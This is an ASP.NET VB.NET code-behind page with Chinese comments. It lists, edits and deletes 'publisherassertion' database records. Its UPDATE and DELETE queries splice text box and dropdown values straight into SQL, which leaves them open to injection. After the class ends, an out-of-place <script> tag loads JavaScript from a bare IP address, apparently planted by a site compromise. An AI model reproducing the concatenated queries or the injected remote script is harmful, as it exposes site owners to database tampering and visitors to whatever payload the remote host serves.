Imports System.Data
Imports System.Data.SqlClient

Public Class to2
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents ddlstAssKey As System.Web.UI.WebControls.DropDownList
    Protected WithEvents lblFrom As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstFrom As System.Web.UI.WebControls.DropDownList
    Protected WithEvents lblFromType As System.Web.UI.WebControls.Label
    Protected WithEvents txtFromType As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblTo As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstTo As System.Web.UI.WebControls.DropDownList
    Protected WithEvents lblToType As System.Web.UI.WebControls.Label
    Protected WithEvents txtToType As System.Web.UI.WebControls.TextBox
    Protected WithEvents btnNext As System.Web.UI.WebControls.Button
    Protected WithEvents btnAdd As System.Web.UI.WebControls.Button
    Protected WithEvents btnDel As System.Web.UI.WebControls.Button
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents btnSearch As System.Web.UI.WebControls.Button
    Protected WithEvents timetext As System.Web.UI.WebControls.Label


    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub Initial(ByVal index As Integer)  ' 初始化页面显示
        Me.ddlstFrom.SelectedIndex = index
        Me.ddlstTo.SelectedIndex = index
        Me.txtFromType.Text = Session("myDateSet").Tables("publisherassertion").Rows(index).Item("vfromobjtype")
        Me.txtToType.Text = Session("myDateSet").Tables("publisherassertion").Rows(index).Item("vtoobjtype")
    End Sub

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码
        Me.lblWarning.Visible = False

        Me.timetext.Text = DateTime.Now.ToString()
        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If

        If Not IsPostBack Then  ' 用户x第一次打开页面时
            Dim strSql As String
            Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
            Try
                mySqlConn.Open()

                Dim mySqlAdapter As New SqlDataAdapter("select * from publisherassertion", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "publisherassertion")

                Me.Session("myDateSet") = myDateSet
                If myDateSet.Tables("publisherassertion").Rows.Count = 0 Then
                    Me.lblWarning.Text = "提醒：没有关系断言存在"
                    Me.lblWarning.Visible = True
                    mySqlConn.Close()
                    Exit Sub
                End If

                Me.ddlstAssKey.DataSource = myDateSet.Tables("publisherassertion").DefaultView
                Me.ddlstAssKey.DataValueField = "assertionkey"
                Me.ddlstAssKey.DataBind()

                Me.ddlstFrom.DataSource = myDateSet.Tables("publisherassertion").DefaultView
                Me.ddlstFrom.DataValueField = "vfrom"
                Me.ddlstFrom.DataBind()

                Me.ddlstTo.DataSource = myDateSet.Tables("publisherassertion").DefaultView
                Me.ddlstTo.DataValueField = "vto"
                Me.ddlstTo.DataBind()

                Initial(0)
                Me.Session("index") = 0
                mySqlConn.Close()
            Catch ex As SqlException
                Throw ex
                'Response.Redirect("error.htm") ' 错误提示
            Finally
            End Try
        End If
    End Sub

    Private Sub btnNext_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNext.Click
        Me.Response.Redirect("modificationlogic.aspx")
    End Sub

    Private Sub btnAdd_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnAdd.Click
        If (Me.ddlstAssKey.Items.Count = 0) Then
            Me.lblWarning.Text = "提醒：没有关系断言存在"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        If (Me.txtFromType.Text.Trim() = "" Or Me.txtToType.Text.Trim() = "") Then
            Me.lblWarning.Text = "提醒：请先填好全部信息"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim mySqlComm As SqlCommand

        Try
            ' 修改数据项
            strSql = "update publisherassertion set vfrom='" + Me.ddlstFrom.SelectedValue.Trim() + _
                "',vfromobjtype='" + Me.txtFromType.Text.Trim() + "',vto= '" + Me.ddlstTo.SelectedValue.Trim() + _
                "',vtoobjtype= '" + Me.txtToType.Text.Trim() + _
                "' where assertionkey='" + Me.ddlstAssKey.SelectedValue.Trim() + "'"
            mySqlComm = New SqlCommand(strSql, mySqlConn)

            mySqlConn.Open()
            If (mySqlComm.ExecuteNonQuery() > 0) Then
                Me.lblWarning.Text = "恭喜：修改关系断言成功" + Me.ddlstAssKey.SelectedValue.Trim() + "成功"
                Me.lblWarning.Visible = True
                Dim mySqlAdapter As New SqlDataAdapter("select * from publisherassertion", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "publisherassertion")
                Me.Session("myDateSet") = myDateSet
                Initial(Me.Session("index"))
            Else
                Me.lblWarning.Text = "警告：由于某种原因修改关系断言失败，可能你没有权限"
                Me.lblWarning.Visible = True
            End If
            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub

    Private Sub btnDel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnDel.Click
        If (Me.ddlstAssKey.Items.Count = 0) Then
            Me.lblWarning.Text = "提醒：没有关系断言存在"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim mySqlComm As SqlCommand

        Try
            ' 修改数据项
            strSql = "delete from publisherassertion where assertionkey='" + Me.ddlstAssKey.SelectedValue.Trim() + "'"
            mySqlComm = New SqlCommand(strSql, mySqlConn)

            mySqlConn.Open()
            If (mySqlComm.ExecuteNonQuery() > 0) Then
                Me.lblWarning.Text = "恭喜：删除关系断言" + Me.ddlstAssKey.SelectedValue.Trim() + "成功"
                Me.lblWarning.Visible = True
                Me.ddlstAssKey.Items.Remove(Me.ddlstAssKey.SelectedValue)
                If (Me.ddlstAssKey.Items.Count = 0) Then
                    mySqlConn.Close()
                    Exit Sub
                End If

                Dim mySqlAdapter As New SqlDataAdapter("select * from publisherassertion", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "publisherassertion")
                Me.Session("myDateSet") = myDateSet
                Initial(Me.Session("index"))
            Else
                Me.lblWarning.Text = "警告：由于某种原因删除关系断言失败，可能你没有权限"
                Me.lblWarning.Visible = True
            End If
            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub

    Private Sub btnSearch_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSearch.Click
        If (Me.ddlstAssKey.Items.Count = 0) Then
            Me.lblWarning.Text = "提醒：没有关系断言存在"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Initial(Me.Session("index"))
    End Sub

    Private Sub ddlstAssKey_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ddlstAssKey.SelectedIndexChanged
        Me.Session("index") = Me.ddlstAssKey.SelectedIndex
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
